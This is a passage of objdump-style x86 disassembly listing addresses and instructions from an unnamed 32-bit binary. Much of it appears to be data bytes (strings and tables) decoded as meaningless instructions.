  4276e5:	add    BYTE PTR [ebx+0x50],cl
  4276e8:	inc    ecx
  4276e9:	pop    edi
  4276ea:	xor    eax,0x364c3737
  4276ef:	xor    BYTE PTR [ecx+0x0],dl
  4276f2:	push   ebx
  4276f3:	push   ebx
  4276f4:	inc    ebx
  4276f5:	xor    bl,BYTE PTR [edi+0x57]
  4276f8:	xor    BYTE PTR [ecx+0x43],al
  4276fb:	push   esp
  4276fc:	xor    eax,0x414a004e
  427701:	inc    ecx
  427702:	pop    edi
  427703:	cmp    DWORD PTR [esi+0x32],edx
  427706:	pop    edi
  427707:	xor    bh,BYTE PTR [ecx]
  427709:	add    BYTE PTR [ebx+0x42],cl
  42770c:	dec    esp
  42770d:	pop    edi
  42770e:	push   esi
  42770f:	xor    eax,0x47004c55
  427714:	xor    ecx,DWORD PTR [eax+0x5f]
  427717:	push   ecx
  427718:	dec    edi
  427719:	push   esp
  42771a:	cmp    BYTE PTR [eax+0x5f],dl
  42771d:	dec    ecx
  42771e:	add    BYTE PTR [ebp+0x33],cl
  427721:	inc    ebp
  427722:	pop    edi
  427723:	inc    edi
  427724:	dec    edi
  427725:	xor    eax,0x455f3249
  42772a:	add    BYTE PTR [edx+0x47],cl
  42772d:	xor    eax,0x4338535f
  427732:	dec    ecx
  427733:	xor    dh,BYTE PTR [eax]
  427735:	pop    edi
  427736:	push   eax
  427737:	add    BYTE PTR [eax+0x0],dl
  42773a:	pop    eax
  42773b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42773f:	add    BYTE PTR [eax+0x0],cl
  427742:	aaa    
  427743:	add    BYTE PTR [ecx+0x0],bl
  427746:	aaa    
  427747:	add    BYTE PTR [edi+0x0],bl
  42774a:	inc    esi
  42774b:	add    BYTE PTR [edi],dh
  42774d:	add    BYTE PTR [ecx+0x0],bl
  427750:	inc    esp
  427751:	add    BYTE PTR [edi+0x0],bl
  427754:	xor    eax,0x52000000
  427759:	add    BYTE PTR [eax+0x0],dl
  42775c:	inc    esi
  42775d:	add    BYTE PTR [edi+0x0],bl
  427760:	dec    esp
  427761:	add    BYTE PTR [ecx+0x0],al
  427764:	push   eax
  427765:	add    BYTE PTR [edi+0x0],bl
  427768:	inc    ecx
  427769:	add    BYTE PTR [edi],dh
  42776b:	add    BYTE PTR [eax+eax*1+0x4a],al
  42776f:	add    BYTE PTR [ebp+0x0],al
  427772:	pop    edi
  427773:	add    BYTE PTR [eax+eax*1],dh
  427776:	add    BYTE PTR [eax],al
  427778:	dec    esp
  427779:	add    BYTE PTR [edi],dh
  42777b:	add    BYTE PTR [ebp+0x0],cl
  42777e:	cmp    BYTE PTR [eax],al
  427780:	xor    al,BYTE PTR [eax]
  427782:	pop    edi
  427783:	add    BYTE PTR [eax],bh
  427785:	add    BYTE PTR [ecx+0x0],al
  427788:	pop    edx
  427789:	add    BYTE PTR [edx+0x0],bl
  42778c:	pop    edi
  42778d:	add    BYTE PTR [ebx],dh
  42778f:	add    BYTE PTR [ebx+0x0],dl
  427792:	add    BYTE PTR [eax],al
  427794:	push   esi
  427795:	add    BYTE PTR [eax],bh
  427797:	add    BYTE PTR [esi+0x0],dl
  42779a:	xor    al,BYTE PTR [eax]
  42779c:	pop    edi
  42779d:	add    BYTE PTR [esi+0x0],al
  4277a0:	inc    ebx
  4277a1:	add    BYTE PTR [edi+0x0],al
  4277a4:	push   edi
  4277a5:	add    BYTE PTR [edi+0x0],bl
  4277a8:	dec    eax
  4277a9:	add    BYTE PTR [edx+0x0],cl
  4277ac:	cmp    DWORD PTR [eax],eax
  4277ae:	aaa    
  4277af:	add    BYTE PTR [eax],al
  4277b1:	add    BYTE PTR [ecx+0x0],cl
  4277b4:	dec    edx
  4277b5:	add    BYTE PTR [ecx+0x0],al
  4277b8:	pop    edi
  4277b9:	add    BYTE PTR [edx+0x0],cl
  4277bc:	inc    esi
  4277bd:	add    BYTE PTR [edi+0x0],dl
  4277c0:	xor    eax,DWORD PTR [eax]
  4277c2:	dec    ebp
  4277c3:	add    BYTE PTR [edi+0x0],bl
  4277c6:	push   eax
  4277c7:	add    BYTE PTR [ecx+0x0],al
  4277ca:	add    BYTE PTR [eax],al
  4277cc:	dec    edi
  4277cd:	add    BYTE PTR [ecx+0x0],bl
  4277d0:	dec    eax
  4277d1:	add    BYTE PTR [edi+0x0],bl
  4277d4:	xor    eax,0x33005000
  4277d9:	add    BYTE PTR [esi+0x0],al
  4277dc:	push   esi
  4277dd:	add    BYTE PTR [edi+0x0],bl
  4277e0:	push   ebx
  4277e1:	add    BYTE PTR [ecx+0x0],dl
  4277e4:	push   ebp
  4277e5:	add    BYTE PTR [eax],al
  4277e7:	add    BYTE PTR [esi+0x0],al
  4277ea:	dec    esp
  4277eb:	add    BYTE PTR [ecx],dh
  4277ed:	add    BYTE PTR [edi+0x0],bl
  4277f0:	dec    ebx
  4277f1:	add    BYTE PTR [edx+0x0],dl
  4277f4:	inc    ebx
  4277f5:	add    BYTE PTR [edi+0x0],bl
  4277f8:	dec    edx
  4277f9:	add    BYTE PTR [eax],bh
  4277fb:	add    BYTE PTR [esi+0x0],dl
  4277fe:	cmp    DWORD PTR [eax],eax
  427800:	cmp    DWORD PTR [eax],eax
  427802:	add    BYTE PTR [eax],al
  427804:	dec    eax
  427805:	add    BYTE PTR [ecx+0x0],bl
  427808:	push   edx
  427809:	add    BYTE PTR [edi+0x0],bl
  42780c:	inc    esp
  42780d:	add    BYTE PTR [ebx+0x0],dl
  427810:	dec    edx
  427811:	add    BYTE PTR [ebx],dh
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [eax+eax*1+0x5a],dl
  427819:	add    BYTE PTR [ecx+0x0],dl
  42781c:	pop    edi
  42781d:	add    BYTE PTR [ebx+0x0],dl
  427820:	cmp    BYTE PTR [eax],al
  427822:	dec    ebx
  427823:	add    BYTE PTR [eax+eax*1],dh
  427826:	xor    al,BYTE PTR [eax]
  427828:	add    BYTE PTR [eax],al
  42782a:	dec    ecx
  42782b:	add    BYTE PTR [eax+0x0],dl
  42782e:	xor    BYTE PTR [eax],al
  427830:	add    BYTE PTR ss:[edi+0x0],bl
  427834:	inc    esi
  427835:	add    BYTE PTR [ebp+0x0],dl
  427838:	inc    edx
  427839:	add    BYTE PTR [eax],al
  42783b:	add    BYTE PTR [edx+0x0],bl
  42783e:	xor    eax,DWORD PTR [eax]
  427840:	inc    ecx
  427841:	add    BYTE PTR [edi],dh
  427843:	add    BYTE PTR [edi+0x0],bl
  427846:	inc    edi
  427847:	add    BYTE PTR [edx+0x0],bl
  42784a:	xor    BYTE PTR [eax],al
  42784c:	push   edx
  42784d:	add    BYTE PTR [edi+0x0],bl
  427850:	aaa    
  427851:	add    BYTE PTR [edx+0x0],dl
  427854:	push   eax
  427855:	add    BYTE PTR [esi+0x0],cl
  427858:	dec    esi
  427859:	add    BYTE PTR [eax],al
  42785b:	add    BYTE PTR [eax+0x0],dl
  42785e:	cmp    DWORD PTR [eax],eax
  427860:	cmp    DWORD PTR [eax],eax
  427862:	xor    eax,DWORD PTR [eax]
  427864:	xor    al,0x0
  427866:	xor    eax,0x36003700
  42786b:	add    BYTE PTR ds:0x41005f00,dh
  427871:	add    BYTE PTR [ecx+0x0],al
  427874:	add    BYTE PTR [eax],al
  427876:	dec    edx
  427877:	add    BYTE PTR [esi+0x0],cl
  42787a:	pop    eax
  42787b:	add    BYTE PTR [edi+0x0],bl
  42787e:	inc    edi
  42787f:	add    BYTE PTR [ecx],bh
  427881:	add    BYTE PTR [edx+0x0],al
  427884:	pop    edx
  427885:	add    BYTE PTR [ebp+0x0],cl
  427888:	pop    edi
  427889:	add    BYTE PTR [ecx+0x0],dl
  42788c:	inc    ebp
  42788d:	add    BYTE PTR [ebp+0x0],dl
  427890:	add    BYTE PTR [eax],al
  427892:	push   eax
  427893:	add    BYTE PTR [eax+eax*1+0x38],al
  427897:	add    BYTE PTR [esi],dh
  427899:	add    BYTE PTR [edi+0x0],bl
  42789c:	xor    al,BYTE PTR [eax]
  42789e:	dec    eax
  42789f:	add    BYTE PTR [esi+0x0],cl
  4278a2:	dec    ecx
  4278a3:	add    BYTE PTR [eax],al
  4278a5:	add    BYTE PTR [eax],al
  4278a7:	xchg   esp,eax
  4278a8:	jne    0x4278ec
  4278aa:	add    BYTE PTR [eax-0x63ffbd8b],bl
  4278b0:	jne    0x4278f4
  4278b2:	add    BYTE PTR [eax-0x5bffbd8b],ah
  4278b8:	jne    0x4278fc
  4278ba:	add    BYTE PTR [eax-0x53ffbd8b],ch
  4278c0:	jne    0x427904
  4278c2:	add    BYTE PTR [eax+0x4275],dh
  4278c8:	add    BYTE PTR [eax],al
  4278ca:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  4278ce:	dec    ebp
  4278cf:	add    BYTE PTR [eax],al
  4278d1:	add    BYTE PTR [eax],al
  4278d3:	add    al,BYTE PTR [eax]
  4278d5:	add    BYTE PTR [eax],al
  4278d7:	inc    edx
  4278d8:	add    BYTE PTR [eax],al
  4278da:	add    BYTE PTR [eax],al
  4278dc:	loopne 0x4278de
  4278de:	add    BYTE PTR [eax],al
  4278e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [eax],al
  4278e5:	add    BYTE PTR [eax],al
  4278e7:	aas    
  4278e8:	add    BYTE PTR [edx],0x0
  4278eb:	push   ecx
  4278ec:	add    BYTE PTR [edx],0x0
  4278ef:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  4278f9:	add    al,BYTE PTR [eax]
  4278fb:	stos   DWORD PTR es:[edi],eax
  4278fc:	add    BYTE PTR [edx],0x0
  4278ff:	add    BYTE PTR [eax],al
  427901:	add    BYTE PTR [eax],al
  427903:	rol    DWORD PTR [edx-0x7d20fffe],1
  427909:	add    al,BYTE PTR [eax]
  42790b:	jmp    0xf3427b92
  427910:	add    BYTE PTR [edx],0x0
  427913:	std    
  427914:	add    BYTE PTR [edx],0x0
  427917:	jae    0x835f791f
  42791d:	add    al,BYTE PTR [eax]
  42791f:	and    eax,0x35000283
  427924:	add    DWORD PTR [edx],0x0
  427927:	aas    
  427928:	add    DWORD PTR [edx],0x0
  42792b:	dec    ecx
  42792c:	add    DWORD PTR [edx],0x0
  42792f:	push   ebx
  427930:	add    DWORD PTR [edx],0x0
  427933:	pop    ebp
  427934:	add    DWORD PTR [edx],0x0
  427937:	add    DWORD PTR [bp+si],0x0
  42793b:	jno    0x4278c0
  42793d:	add    al,BYTE PTR [eax]
  42793f:	jns    0x4278c4
  427941:	add    al,BYTE PTR [eax]
  427943:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  42794d:	add    al,BYTE PTR [eax]
  42794f:	lahf   
  427950:	add    DWORD PTR [edx],0x0
  427953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427954:	add    DWORD PTR [edx],0x0
  427957:	mov    ch,0x83
  427959:	add    al,BYTE PTR [eax]
  42795b:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427962:	add    cl,bl
  427964:	add    DWORD PTR [edx],0x0
  427967:	jecxz  0x4278ec
  427969:	add    al,BYTE PTR [eax]
  42796b:	out    dx,eax
  42796c:	add    DWORD PTR [edx],0x0
  42796f:	std    
  427970:	add    DWORD PTR [edx],0x0
  427973:	pop    es
  427974:	test   BYTE PTR [edx],al
  427976:	add    BYTE PTR [ecx],dl
  427978:	test   BYTE PTR [edx],al
  42797a:	add    BYTE PTR [edi],bl
  42797c:	test   BYTE PTR [edx],al
  42797e:	add    BYTE PTR [edi],ah
  427980:	test   BYTE PTR [edx],al
  427982:	add    BYTE PTR [ecx],dh
  427984:	test   BYTE PTR [edx],al
  427986:	add    BYTE PTR [ebx],bh
  427988:	test   BYTE PTR [edx],al
  42798a:	add    BYTE PTR [ebp-0x7c],al
  42798d:	add    al,BYTE PTR [eax]
  42798f:	dec    ebp
  427990:	test   BYTE PTR [edx],al
  427992:	add    BYTE PTR [edi-0x7c],dl
  427995:	add    al,BYTE PTR [eax]
  427997:	popa   
  427998:	test   BYTE PTR [edx],al
  42799a:	add    BYTE PTR [ebx-0x7c],ch
  42799d:	add    al,BYTE PTR [eax]
  42799f:	jg     0x427925
  4279a1:	add    al,BYTE PTR [eax]
  4279a3:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  4279aa:	add    BYTE PTR [ebx-0x54fffd7c],bl
  4279b0:	test   BYTE PTR [edx],al
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	add    cl,al
  4279b8:	test   BYTE PTR [edx],al
  4279ba:	add    cl,bl
  4279bc:	test   BYTE PTR [edx],al
  4279be:	add    bh,ah
  4279c0:	test   BYTE PTR [edx],al
  4279c2:	add    bl,bh
  4279c4:	test   BYTE PTR [edx],al
  4279c6:	add    BYTE PTR ds:0x1d000285,cl
  4279cc:	test   DWORD PTR [edx],eax
  4279ce:	add    BYTE PTR [edi],ch
  4279d0:	test   DWORD PTR [edx],eax
  4279d2:	add    BYTE PTR ds:0x51000285,bh
  4279d8:	test   DWORD PTR [edx],eax
  4279da:	add    BYTE PTR [ecx-0x7b],ah
  4279dd:	add    al,BYTE PTR [eax]
  4279df:	ja     0x427966
  4279e1:	add    al,BYTE PTR [eax]
  4279e3:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  4279e9:	add    al,BYTE PTR [eax]
  4279eb:	mov    ds:0xb9000285,eax
  4279f0:	test   DWORD PTR [edx],eax
  4279f2:	add    cl,cl
  4279f4:	test   DWORD PTR [edx],eax
  4279f6:	add    ch,dl
  4279f8:	test   DWORD PTR [edx],eax
  4279fa:	add    bh,ah
  4279fc:	test   DWORD PTR [edx],eax
  4279fe:	add    cl,dh
  427a00:	test   DWORD PTR [edx],eax
  427a02:	add    BYTE PTR [ebx],cl
  427a04:	xchg   BYTE PTR [edx],al
  427a06:	add    BYTE PTR [ecx],ah
  427a08:	xchg   BYTE PTR [edx],al
  427a0a:	add    BYTE PTR ds:0x45000286,dh
  427a10:	xchg   BYTE PTR [edx],al
  427a12:	add    BYTE PTR [ecx-0x7a],dl
  427a15:	add    al,BYTE PTR [eax]
  427a17:	popa   
  427a18:	xchg   BYTE PTR [edx],al
  427a1a:	add    BYTE PTR [ebp-0x7a],ch
  427a1d:	add    al,BYTE PTR [eax]
  427a1f:	jg     0x4279a7
  427a21:	add    al,BYTE PTR [eax]
  427a23:	lea    eax,[esi-0x7964fffe]
  427a29:	add    al,BYTE PTR [eax]
  427a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2c:	xchg   BYTE PTR [edx],al
  427a2e:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427a34:	xchg   BYTE PTR [edx],al
  427a36:	add    cl,bl
  427a38:	xchg   BYTE PTR [edx],al
  427a3a:	add    ch,ch
  427a3c:	xchg   BYTE PTR [edx],al
  427a3e:	add    bl,bh
  427a40:	xchg   BYTE PTR [edx],al
  427a42:	add    BYTE PTR ds:0x1d000287,cl
  427a48:	xchg   DWORD PTR [edx],eax
  427a4a:	add    BYTE PTR [ebx],ch
  427a4c:	xchg   DWORD PTR [edx],eax
  427a4e:	add    BYTE PTR [ecx-0x79],al
  427a51:	add    al,BYTE PTR [eax]
  427a53:	dec    ebp
  427a54:	xchg   DWORD PTR [edx],eax
  427a56:	add    BYTE PTR [ebx-0x79],ah
  427a59:	add    al,BYTE PTR [eax]
  427a5b:	jg     0x4279e4
  427a5d:	add    al,BYTE PTR [eax]
  427a5f:	xchg   ebx,eax
  427a60:	xchg   DWORD PTR [edx],eax
  427a62:	add    BYTE PTR [edi-0x44fffd79],ah
  427a68:	xchg   DWORD PTR [edx],eax
  427a6a:	add    cl,dl
  427a6c:	xchg   DWORD PTR [edx],eax
  427a6e:	add    cl,ch
  427a70:	xchg   DWORD PTR [edx],eax
  427a72:	add    bh,dh
  427a74:	xchg   DWORD PTR [edx],eax
  427a76:	add    BYTE PTR [ecx],cl
  427a78:	mov    BYTE PTR [edx],al
  427a7a:	add    BYTE PTR [edi],bl
  427a7c:	mov    BYTE PTR [edx],al
  427a7e:	add    BYTE PTR [ecx],dh
  427a80:	mov    BYTE PTR [edx],al
  427a82:	add    BYTE PTR [ebp-0x78],al
  427a85:	add    al,BYTE PTR [eax]
  427a87:	add    BYTE PTR [eax],al
  427a89:	add    BYTE PTR [eax],al
  427a8b:	mov    BYTE PTR gs:[edx],al
  427a8e:	add    BYTE PTR [ebx-0x78],dh
  427a91:	add    al,BYTE PTR [eax]
  427a93:	test   DWORD PTR [eax-0x7768fffe],ecx
  427a99:	add    al,BYTE PTR [eax]
  427a9b:	mov    ds:0xb5000288,eax
  427aa0:	mov    BYTE PTR [edx],al
  427aa2:	add    bh,al
  427aa4:	mov    BYTE PTR [edx],al
  427aa6:	add    bl,bl
  427aa8:	mov    BYTE PTR [edx],al
  427aaa:	add    bh,ah
  427aac:	mov    BYTE PTR [edx],al
  427aae:	add    ch,dh
  427ab0:	mov    BYTE PTR [edx],al
  427ab2:	add    BYTE PTR [ecx],al
  427ab4:	mov    DWORD PTR [edx],eax
  427ab6:	add    BYTE PTR [ebx],dl
  427ab8:	mov    DWORD PTR [edx],eax
  427aba:	add    BYTE PTR [ecx],ah
  427abc:	mov    DWORD PTR [edx],eax
  427abe:	add    BYTE PTR [edi],ch
  427ac0:	mov    DWORD PTR [edx],eax
  427ac2:	add    BYTE PTR [ebx-0x77],cl
  427ac5:	add    al,BYTE PTR [eax]
  427ac7:	pop    ebx
  427ac8:	mov    DWORD PTR [edx],eax
  427aca:	add    BYTE PTR [ebp-0x77],dh
  427acd:	add    al,BYTE PTR [eax]
  427acf:	test   DWORD PTR [ecx-0x7664fffe],ecx
  427ad5:	add    al,BYTE PTR [eax]
  427ad7:	stos   DWORD PTR es:[edi],eax
  427ad8:	mov    DWORD PTR [edx],eax
  427ada:	add    BYTE PTR [edi-0x34fffd77],dh
  427ae0:	mov    DWORD PTR [edx],eax
  427ae2:	add    bl,ah
  427ae4:	mov    DWORD PTR [edx],eax
  427ae6:	add    bh,ch
  427ae8:	mov    DWORD PTR [edx],eax
  427aea:	add    bh,bh
  427aec:	mov    DWORD PTR [edx],eax
  427aee:	add    BYTE PTR [ebx],cl
  427af0:	mov    al,BYTE PTR [edx]
  427af2:	add    BYTE PTR [edi],dl
  427af4:	mov    al,BYTE PTR [edx]
  427af6:	add    BYTE PTR ds:0x2f00028a,ah
  427afc:	mov    al,BYTE PTR [edx]
  427afe:	add    BYTE PTR [edi],bh
  427b00:	mov    al,BYTE PTR [edx]
  427b02:	add    BYTE PTR [ecx-0x76],dl
  427b05:	add    al,BYTE PTR [eax]
  427b07:	pop    ebp
  427b08:	mov    al,BYTE PTR [edx]
  427b0a:	add    BYTE PTR [edi-0x76],ch
  427b0d:	add    al,BYTE PTR [eax]
  427b0f:	jnp    0x427a9b
  427b11:	add    al,BYTE PTR [eax]
  427b13:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  427b19:	add    al,BYTE PTR [eax]
  427b1b:	lods   eax,DWORD PTR ds:[esi]
  427b1c:	mov    al,BYTE PTR [edx]
  427b1e:	add    BYTE PTR [ebx-0x32fffd76],bh
  427b24:	mov    al,BYTE PTR [edx]
  427b26:	add    ch,bl
  427b28:	mov    al,BYTE PTR [edx]
  427b2a:	add    ch,ch
  427b2c:	mov    al,BYTE PTR [edx]
  427b2e:	add    BYTE PTR [ecx],cl
  427b30:	mov    eax,DWORD PTR [edx]
  427b32:	add    BYTE PTR [ecx],bl
  427b34:	mov    eax,DWORD PTR [edx]
  427b36:	add    BYTE PTR [ecx],ch
  427b38:	mov    eax,DWORD PTR [edx]
  427b3a:	add    BYTE PTR [edi],dh
  427b3c:	mov    eax,DWORD PTR [edx]
  427b3e:	add    BYTE PTR [ebp-0x75],cl
  427b41:	add    al,BYTE PTR [eax]
  427b43:	pop    ebx
  427b44:	mov    eax,DWORD PTR [edx]
  427b46:	add    BYTE PTR [ebp-0x75],ah
  427b49:	add    al,BYTE PTR [eax]
  427b4b:	jno    0x427ad8
  427b4d:	add    al,BYTE PTR [eax]
  427b4f:	or     DWORD PTR [ebx-0x7464fffe],0x2
  427b56:	add    BYTE PTR [ebp-0x42fffd75],ch
  427b5c:	mov    eax,DWORD PTR [edx]
  427b5e:	add    cl,dl
  427b60:	mov    eax,DWORD PTR [edx]
  427b62:	add    cl,ah
  427b64:	mov    eax,DWORD PTR [edx]
  427b66:	add    bh,dh
  427b68:	mov    eax,DWORD PTR [edx]
  427b6a:	add    BYTE PTR ds:0x1900028c,al
  427b70:	mov    WORD PTR [edx],es
  427b72:	add    BYTE PTR [edi],ah
  427b74:	mov    WORD PTR [edx],es
  427b76:	add    BYTE PTR [ecx],bh
  427b78:	mov    WORD PTR [edx],es
  427b7a:	add    BYTE PTR [ebx-0x74],cl
  427b7d:	add    al,BYTE PTR [eax]
  427b7f:	pop    ebp
  427b80:	mov    WORD PTR [edx],es
  427b82:	add    BYTE PTR [ecx-0x74],ch
  427b85:	add    al,BYTE PTR [eax]
  427b87:	ja     0x427b15
  427b89:	add    al,BYTE PTR [eax]
  427b8b:	lea    ecx,[edx+eax*1+0x28ca100]
  427b92:	add    BYTE PTR [ebp-0x38fffd74],dh
  427b98:	mov    WORD PTR [edx],es
  427b9a:	add    cl,dl
  427b9c:	mov    WORD PTR [edx],es
  427b9e:	add    bl,ah
  427ba0:	mov    WORD PTR [edx],es
  427ba2:	add    bh,dh
  427ba4:	mov    WORD PTR [edx],es
  427ba6:	add    BYTE PTR [ebx],cl
  427ba8:	lea    eax,[edx]
  427baa:	add    BYTE PTR [ebx],bl
  427bac:	lea    eax,[edx]
  427bae:	add    BYTE PTR [ecx],ch
  427bb0:	lea    eax,[edx]
  427bb2:	add    BYTE PTR [ebx-0x73],al
  427bb5:	add    al,BYTE PTR [eax]
  427bb7:	pop    ebx
  427bb8:	lea    eax,[edx]
  427bba:	add    BYTE PTR [ecx-0x73],ch
  427bbd:	add    al,BYTE PTR [eax]
  427bbf:	jnp    0x427b4e
  427bc1:	add    al,BYTE PTR [eax]
  427bc3:	mov    DWORD PTR [ebp-0x726afffe],ecx
  427bc9:	add    al,BYTE PTR [eax]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	lea    eax,[edx]
  427bce:	add    cl,al
  427bd0:	lea    eax,[edx]
  427bd2:	add    bl,dl
  427bd4:	lea    eax,[edx]
  427bd6:	add    bl,ah
  427bd8:	lea    eax,[edx]
  427bda:	add    bl,dh
  427bdc:	lea    eax,[edx]
  427bde:	add    ch,bh
  427be0:	lea    eax,[edx]
  427be2:	add    BYTE PTR ds:0x1f00028e,cl
  427be8:	mov    es,WORD PTR [edx]
  427bea:	add    BYTE PTR [edi],ch
  427bec:	mov    es,WORD PTR [edx]
  427bee:	add    BYTE PTR [ebp-0x72],al
  427bf1:	add    al,BYTE PTR [eax]
  427bf3:	pop    ebp
  427bf4:	mov    es,WORD PTR [edx]
  427bf6:	add    BYTE PTR [edi-0x72],ch
  427bf9:	add    al,BYTE PTR [eax]
  427bfb:	jg     0x427b8b
  427bfd:	add    al,BYTE PTR [eax]
  427bff:	xchg   ecx,eax
  427c00:	mov    es,WORD PTR [edx]
  427c02:	add    BYTE PTR [edi-0x4efffd72],bl
  427c08:	mov    es,WORD PTR [edx]
  427c0a:	add    BYTE PTR [edi-0x2efffd72],bh
  427c10:	mov    es,WORD PTR [edx]
  427c12:	add    bl,ah
  427c14:	mov    es,WORD PTR [edx]
  427c16:	add    bh,dh
  427c18:	mov    es,WORD PTR [edx]
  427c1a:	add    BYTE PTR [ebx],cl
  427c1c:	pop    DWORD PTR [edx]
  427c1e:	add    BYTE PTR ds:0x3300028f,bl
  427c24:	pop    DWORD PTR [edx]
  427c26:	add    BYTE PTR [ebp-0x71],al
  427c29:	add    al,BYTE PTR [eax]
  427c2b:	popa   
  427c2c:	pop    DWORD PTR [edx]
  427c2e:	add    BYTE PTR [edi-0x71],dh
  427c31:	add    al,BYTE PTR [eax]
  427c33:	test   DWORD PTR [edi-0x7066fffe],ecx
  427c39:	add    al,BYTE PTR [eax]
  427c3b:	add    BYTE PTR [eax],al
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	mov    bl,0x8f
  427c41:	add    al,BYTE PTR [eax]
  427c43:	ret    
  427c44:	pop    DWORD PTR [edx]
  427c46:	add    bl,bl
  427c48:	pop    DWORD PTR [edx]
  427c4a:	add    ch,ah
  427c4c:	pop    DWORD PTR [edx]
  427c4e:	add    ch,dh
  427c50:	pop    DWORD PTR [edx]
  427c52:	add    BYTE PTR [ecx],cl
  427c54:	nop
  427c55:	add    al,BYTE PTR [eax]
  427c57:	pop    ss
  427c58:	nop
  427c59:	add    al,BYTE PTR [eax]
  427c5b:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  427c61:	add    al,BYTE PTR [eax]
  427c63:	dec    edi
  427c64:	nop
  427c65:	add    al,BYTE PTR [eax]
  427c67:	pop    ebp
  427c68:	nop
  427c69:	add    al,BYTE PTR [eax]
  427c6b:	addr16 nop
  427c6d:	add    al,BYTE PTR [eax]
  427c6f:	jns    0x427c01
  427c71:	add    al,BYTE PTR [eax]
  427c73:	lea    edx,[eax-0x6f66fffe]
  427c79:	add    al,BYTE PTR [eax]
  427c7b:	scas   eax,DWORD PTR es:[edi]
  427c7c:	nop
  427c7d:	add    al,BYTE PTR [eax]
  427c7f:	ret    
  427c80:	nop
  427c81:	add    al,BYTE PTR [eax]
  427c83:	rcl    DWORD PTR [eax-0x6f1afffe],1
  427c89:	add    al,BYTE PTR [eax]
  427c8b:	stc    
  427c8c:	nop
  427c8d:	add    al,BYTE PTR [eax]
  427c8f:	add    eax,0x11000291
  427c94:	xchg   ecx,eax
  427c95:	add    al,BYTE PTR [eax]
  427c97:	daa    
  427c98:	xchg   ecx,eax
  427c99:	add    al,BYTE PTR [eax]
  427c9b:	xor    eax,0x41000291
  427ca0:	xchg   ecx,eax
  427ca1:	add    al,BYTE PTR [eax]
  427ca3:	push   ebx
  427ca4:	xchg   ecx,eax
  427ca5:	add    al,BYTE PTR [eax]
  427ca7:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  427cb1:	add    al,BYTE PTR [eax]
  427cb3:	fwait
  427cb4:	xchg   ecx,eax
  427cb5:	add    al,BYTE PTR [eax]
  427cb7:	stos   DWORD PTR es:[edi],eax
  427cb8:	xchg   ecx,eax
  427cb9:	add    al,BYTE PTR [eax]
  427cbb:	mov    ecx,0xc3000291
  427cc0:	xchg   ecx,eax
  427cc1:	add    al,BYTE PTR [eax]
  427cc3:	int    0x91
  427cc5:	add    al,BYTE PTR [eax]
  427cc7:	fst    DWORD PTR [ecx-0x6e1afffe]
  427ccd:	add    al,BYTE PTR [eax]
  427ccf:	not    DWORD PTR [ecx-0x6df2fffe]
  427cd5:	add    al,BYTE PTR [eax]
  427cd7:	daa    
  427cd8:	xchg   edx,eax
  427cd9:	add    al,BYTE PTR [eax]
  427cdb:	aaa    
  427cdc:	xchg   edx,eax
  427cdd:	add    al,BYTE PTR [eax]
  427cdf:	inc    ecx
  427ce0:	xchg   edx,eax
  427ce1:	add    al,BYTE PTR [eax]
  427ce3:	push   ecx
  427ce4:	xchg   edx,eax
  427ce5:	add    al,BYTE PTR [eax]
  427ce7:	arpl   WORD PTR [edx-0x6d8efffe],dx
  427ced:	add    al,BYTE PTR [eax]
  427cef:	mov    edx,DWORD PTR [edx+0x2]
  427cf5:	add    BYTE PTR [eax],al
  427cf7:	inc    edx
  427cf8:	xor    al,0x10
  427cfa:	add    cl,dl
  427cfc:	add    dl,BYTE PTR [eax]
  427cfe:	add    BYTE PTR [edi],bh
  427d00:	jge    0x427d12
  427d02:	add    BYTE PTR ds:0xe1001070,dl
  427d08:	jae    0x427d1a
  427d0a:	add    BYTE PTR [esi-0x52ffeff5],al
  427d10:	jae    0x427d22
  427d12:	add    BYTE PTR [edx+0x25],ah
  427d15:	adc    BYTE PTR [eax],al
  427d17:	je     0x427d44
  427d19:	adc    BYTE PTR [eax],al
  427d1b:	sahf   
  427d1c:	jp     0x427d2e
  427d1e:	add    BYTE PTR [edi],ch
  427d20:	adc    BYTE PTR [eax],dl
	...
  427d2a:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  427d2e:	dec    ebp
  427d2f:	add    BYTE PTR [eax],al
  427d31:	add    BYTE PTR [eax],al
  427d33:	pop    ecx
  427d34:	jge    0x427d38
  427d36:	add    BYTE PTR [ecx],al
  427d38:	add    BYTE PTR [eax],al
  427d3a:	add    BYTE PTR [ecx],al
  427d3c:	add    BYTE PTR [eax],al
  427d3e:	add    BYTE PTR [ecx],al
  427d40:	add    BYTE PTR [eax],al
  427d42:	add    BYTE PTR [edi+0x7d],cl
  427d45:	add    al,BYTE PTR [eax]
  427d47:	push   ebx
  427d48:	jge    0x427d4c
  427d4a:	add    BYTE PTR [edi+0x7d],dl
  427d4d:	add    al,BYTE PTR [eax]
  427d4f:	in     eax,dx
  427d50:	arpl   WORD PTR [eax],ax
  427d52:	add    BYTE PTR [edx+0x7d],ch
  427d55:	add    al,BYTE PTR [eax]
  427d57:	add    BYTE PTR [eax],al
  427d59:	dec    bp
  427d5b:	jno    0x427db2
  427d5d:	outs   dx,DWORD PTR ds:[esi]
  427d5e:	pop    ecx
  427d5f:	xor    al,0x55
  427d61:	jbe    0x427dd1
  427d63:	dec    eax
  427d64:	cs data16 ins BYTE PTR es:[di],dx
  427d68:	jo     0x427d6a
  427d6a:	aas    
  427d6b:	inc    edi
  427d6c:	outs   dx,BYTE PTR gs:[esi]
  427d6e:	gs jb  0x427dd2
